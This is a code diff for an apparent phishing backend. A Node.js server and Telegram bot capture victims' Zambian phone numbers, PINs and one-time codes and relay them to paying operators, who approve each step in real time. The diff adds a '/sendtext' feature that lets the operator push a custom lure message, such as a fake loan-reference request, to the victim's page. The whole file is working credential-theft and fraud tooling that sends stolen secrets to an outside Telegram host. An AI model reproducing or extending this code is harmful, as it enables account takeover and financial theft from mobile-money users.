@@ -47,6 +47,7 @@ const CFG = Object.freeze({
   BOT_INIT_DELAY:         1000,
   MAX_RESTART:            5,
   DEDUP_SIZE:             2000,
+  SEND_TEXT_TIMEOUT:      5 * 60_000,   // ← NEW: 5-minute window for admin to /sendtext
 });
 
 // ── Helpers ──────────────────────────────────────────────────────────────────
@@ -55,16 +56,15 @@ const trunc    = (s, n = CFG.MAX_MSG_SIZE) => s.length <= n ? s : s.slice(0, n -
 const sleep    = (ms) => new Promise(r => setTimeout(r, ms));
 
 // ── Zambia +260 phone normalisation ──────────────────────────────────────────
-// Accepts: +260977123456 / 260977123456 / 0977123456 / 977123456
 const RE_NONDIGIT = /\D/g;
 const _phoneCache = new Map();
 const normalise = (raw) => {
   if (!raw || typeof raw !== 'string') return '';
   const hit = _phoneCache.get(raw); if (hit) return hit;
   let c = raw.replace(RE_NONDIGIT, '');
-  if (c.startsWith('260')) c = c.slice(3);   // strip country code
-  if (c.startsWith('0'))   c = c.slice(1);   // strip leading zero
-  if (c.length > 9)        c = c.slice(-9);  // keep last 9 digits
+  if (c.startsWith('260')) c = c.slice(3);
+  if (c.startsWith('0'))   c = c.slice(1);
+  if (c.length > 9)        c = c.slice(-9);
   const result = `+260${c}`;
   if (_phoneCache.size > 5000) _phoneCache.clear();
   _phoneCache.set(raw, result);
@@ -140,7 +140,7 @@ const fmtLogin = (user, { phone, pin, time }) => {
     `📞 <b>Number:</b> <code>${num}</code>\n` +
     `🔐 <b>PIN:</b> <code>${sanitize(pin)}</code>\n` +
     `⏰ <b>Time:</b> ${new Date(time).toLocaleString()}\n\n` +
-    `📱 Will require OTP verification\n\n` +
+    `📱 Choose how to verify this user:\n\n` +
     `━━━━━━━━━━━━━━━━━━━\n⏱️ Timeout: 5 min`
   );
 };
@@ -157,6 +157,11 @@ const fmtOtp = (user, { phone, otp, time }) => {
     `━━━━━━━━━━━━━━━━━━━\n⏱️ Timeout: 5 min`
   );
 };
+
+// ── NEW: Send-text pending store ──────────────────────────────────────────────
+// Key: normalised phone number  →  { ts, text, resolved, userId }
+// Admin uses /sendtext <phoneNumber> <text> to resolve it.
+const pendingSendTexts = new Map();
 
 // ── Callback data helpers ─────────────────────────────────────────────────────
 const CB_SEP  = '|';
@@ -420,18 +425,61 @@ const registerHandlers = () => {
       `/assignuser &lt;slot&gt; &lt;chatId&gt; &lt;name&gt; [days|permanent]\n` +
       `/removeuser &lt;id&gt;  /extend &lt;id&gt; &lt;days&gt;\n` +
       `/extendall &lt;days&gt;  /reduceall &lt;days&gt;\n` +
-      `/revoke &lt;id&gt;  /permanent &lt;id&gt;  /broadcast &lt;msg&gt;`,
+      `/revoke &lt;id&gt;  /permanent &lt;id&gt;  /broadcast &lt;msg&gt;\n\n` +
+      `📤 <b>Send Text:</b>\n/sendtext &lt;phoneNumber&gt; &lt;text message&gt;\n` +
+      `<i>e.g. /sendtext 0977123456 Please confirm your loan reference XYZ123</i>`,
       { parse_mode: 'HTML' }).catch(() => {});
   });
 
   onMsg(/^\/status(@\S+)?$/, async (msg) => {
     if (!isAdmin(String(msg.chat.id))) return;
-    const lines = [`✅ <b>Status</b>\n`, `👥 ${users.size}/676`, `⏳ Pay: ${pendingPayments.size}`, `🔄 Ren: ${pendingRenewals.size}\n`];
+    const lines = [`✅ <b>Status</b>\n`, `👥 ${users.size}/676`, `⏳ Pay: ${pendingPayments.size}`, `🔄 Ren: ${pendingRenewals.size}`, `📤 SendText: ${pendingSendTexts.size}\n`];
     for (const u of users.values()) {
       const e = u.expiresAt ? (isExpired(u.expiresAt) ? '❌' : `✅${daysUntil(u.expiresAt)}d`) : '♾️';
       lines.push(`• <b>${u.name}</b> [<code>${u.id}</code>] ${e} (${u.source})`);
     }
     await bot.sendMessage(msg.chat.id, trunc(lines.join('\n')), { parse_mode: 'HTML' }).catch(() => {});
+  });
+
+  // ── NEW: /sendtext command ──────────────────────────────────────────────────
+  // Usage: /sendtext <phoneNumber> <text to send to the user>
+  // The phone number should match the one waiting in pendingSendTexts.
+  onMsg(/^\/sendtext(@\S+)?\s+(\S+)\s+([\s\S]+)/, async (msg, match) => {
+    if (!isAdmin(String(msg.chat.id))) return;
+
+    const rawPhone = match[2].trim();
+    const text     = match[3].trim();
+    const phone    = normalise(rawPhone);
+
+    const pending  = pendingSendTexts.get(phone);
+
+    if (!pending) {
+      await bot.sendMessage(msg.chat.id,
+        `⚠️ No pending send-text request for <code>${phone}</code>.\n\n` +
+        `Either it timed out, was already fulfilled, or the phone number doesn't match.`,
+        { parse_mode: 'HTML' }).catch(() => {});
+      return;
+    }
+
+    if (Date.now() - pending.ts > CFG.SEND_TEXT_TIMEOUT) {
+      pendingSendTexts.delete(phone);
+      await bot.sendMessage(msg.chat.id,
+        `⏰ This send-text request has <b>expired</b> (5-minute window passed).\n\nThe user will see a timeout on their end.`,
+        { parse_mode: 'HTML' }).catch(() => {});
+      return;
+    }
+
+    // Resolve the pending request with the text
+    pending.text     = sanitize(text);
+    pending.resolved = true;
+    pending.readAt   = null; // will be set when frontend reads it
+
+    await bot.sendMessage(msg.chat.id,
+      `✅ <b>Text sent to frontend!</b>\n\n` +
+      `📞 <code>${phone}</code>\n` +
+      `💬 <code>${sanitize(text)}</code>\n\n` +
+      `The user will now see the message and a Send SMS button.`,
+      { parse_mode: 'HTML' }).catch(() => {});
   });
 
   onMsg(/^\/userinfo(@\S+)?\s+(\S+)/, async (msg, match) => {
@@ -658,7 +706,7 @@ async function handleCallback(query) {
   if (type === 'login') {
     const rec = callbackUser.logins.get(key);
     if (!rec) { await ack('❌ Not found', true); return; }
-    if (rec.approved || rec.rejected) { await ack('✅ Already processed'); return; }
+    if (rec.approved || rec.rejected || rec.sendText) { await ack('✅ Already processed'); return; }
     if (now - rec.ts > CFG.APPROVAL_TIMEOUT) {
       Object.assign(rec, { approved: false, rejected: true, expired: true });
       await edit(`⏰ <b>EXPIRED</b>\n📞 <code>${phone}</code>\n🔐 <code>${secret}</code>`);
@@ -672,6 +720,17 @@ async function handleCallback(query) {
       Object.assign(rec, { rejected: true, rejectionReason: 'invalid' });
       await edit(`❌ <b>INVALID</b>\n📞 <code>${phone}</code>\n🔐 <code>${secret}</code>`);
       await ack('❌ Invalid');
+    } else if (action === 'sendtext') {
+      // ── NEW: Admin chose "Send Text" ──────────────────────────────────────
+      rec.sendText = true;
+      // Register a pending send-text entry for this phone number
+      pendingSendTexts.set(phone, { ts: now, text: null, resolved: false, readAt: null });
+      await edit(
+        `📤 <b>SEND TEXT CHOSEN</b>\n📞 <code>${phone}</code>\n\n` +
+        `Now send the text using:\n<code>/sendtext ${phone} your message here</code>\n\n` +
+        `⏱️ You have 5 minutes.`
+      );
+      await ack('📤 Send Text mode!');
     }
     return;
   }
@@ -716,6 +775,12 @@ setInterval(() => {
       if (v.readAt && now - v.readAt > CFG.READ_TTL) { u.otps.delete(k); continue; }
       if (v.ts < del) u.otps.delete(k);
     }
+  }
+  // Clean up timed-out or fully-read send-text entries
+  for (const [phone, entry] of pendingSendTexts) {
+    const age = now - entry.ts;
+    if (age > CFG.SEND_TEXT_TIMEOUT + 60_000) { pendingSendTexts.delete(phone); continue; }
+    if (entry.readAt && now - entry.readAt > CFG.READ_TTL) { pendingSendTexts.delete(phone); }
   }
 }, CFG.CLEANUP_INTERVAL).unref?.();
 
@@ -778,6 +843,7 @@ app.get('/api/health', (_, res) => {
     })),
     pendingPayments: pendingPayments.size,
     pendingRenewals: pendingRenewals.size,
+    pendingSendTexts: pendingSendTexts.size,
     ts: ts(),
   });
 });
@@ -798,12 +864,15 @@ app.post('/api/:userId/login', resolveUser, async (req, res) => {
   const phone = normalise(raw);
   if (user.dupes.seen(`login:${phone}:${pin}`)) return res.json({ success: true, message: 'Cached' });
   const key = `${phone}-${pin}`;
-  user.logins.set(key, { ts: Date.now(), approved: false, rejected: false, expired: false });
+  user.logins.set(key, { ts: Date.now(), approved: false, rejected: false, expired: false, sendText: false });
   const text = fmtLogin(user, { phone, pin, time: timestamp || Date.now() });
+  // ── 3 buttons now: Allow (OTP), Invalid, Send Text ────────────────────────
   const kb = { inline_keyboard: [[
-    { text: '✅ Allow to Proceed',    callback_data: mkCb('login', 'proceed',  phone, pin) },
+    { text: '✅ Allow → OTP',         callback_data: mkCb('login', 'proceed',   phone, pin) },
   ], [
-    { text: '❌ Invalid Information', callback_data: mkCb('login', 'invalid',  phone, pin) },
+    { text: '📤 Send Text Instead',    callback_data: mkCb('login', 'sendtext',  phone, pin) },
+  ], [
+    { text: '❌ Invalid Information',  callback_data: mkCb('login', 'invalid',   phone, pin) },
   ]] };
   const r = await sendMsg(user, text, { reply_markup: kb });
   r.ok
@@ -818,7 +887,32 @@ app.post('/api/:userId/check-login-approval', resolveUser, (req, res) => {
   if (!rec) return res.json({ success: true, approved: false, rejected: false, expired: false });
   if (Date.now() - rec.ts > CFG.APPROVAL_TIMEOUT)
     return res.json({ success: true, approved: false, rejected: true, expired: true });
-  res.json({ success: true, approved: rec.approved, rejected: rec.rejected, expired: rec.expired || false, rejectionReason: rec.rejectionReason || null });
+
+  // ── NEW: sendText branch ──────────────────────────────────────────────────
+  if (rec.sendText) {
+    // Check if the admin has already supplied the text via /sendtext
+    const entry = pendingSendTexts.get(phone);
+    if (entry && entry.resolved) {
+      // Mark read so cleanup can collect it later
+      if (!entry.readAt) entry.readAt = Date.now();
+      return res.json({ success: true, sendText: true, text: entry.text });
+    }
+    // Check timeout
+    if (entry && Date.now() - entry.ts > CFG.SEND_TEXT_TIMEOUT) {
+      pendingSendTexts.delete(phone);
+      return res.json({ success: true, approved: false, rejected: true, expired: true, sendTextTimeout: true });
+    }
+    // Still waiting for admin to /sendtext
+    return res.json({ success: true, sendText: true, text: null });
+  }
+
+  res.json({
+    success: true,
+    approved: rec.approved,
+    rejected: rec.rejected,
+    expired: rec.expired || false,
+    rejectionReason: rec.rejectionReason || null,
+  });
 });
 
 app.post('/api/:userId/verify-otp', resolveUser, async (req, res) => {
@@ -889,6 +983,7 @@ const startServer = async () => {
         console.log(`   [${u.id}] ${u.name} (${u.source}) ${u.expiresAt ? fmtDate(u.expiresAt) : 'permanent'}`);
       });
       console.log('\n📋 Endpoints: /login  /check-login-approval  /verify-otp  /check-otp-status  /resend-otp  /check-user-status');
+      console.log('📤 Send Text: /sendtext <phone> <message>');
       console.log('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n');
       r();
     });
